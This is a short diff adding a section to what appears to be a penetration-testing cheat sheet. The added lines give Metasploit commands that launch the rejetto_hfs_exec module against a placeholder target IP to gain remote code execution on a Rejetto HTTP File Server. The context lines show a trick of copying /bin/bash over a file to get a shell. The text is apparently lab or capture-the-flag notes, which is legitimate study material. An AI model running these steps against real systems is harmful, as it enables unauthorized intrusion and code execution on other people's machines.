@@ -3050,3 +3050,14 @@ rm greetings
 cp /bin/bash greetings
 ./<file-name>
 ```
+
+#### Exploit HTPP file server rejetto
+
+```shell
+msfconsole
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS <target-IP>
+run
+```
+> exploit the rejetto vulnerability
+
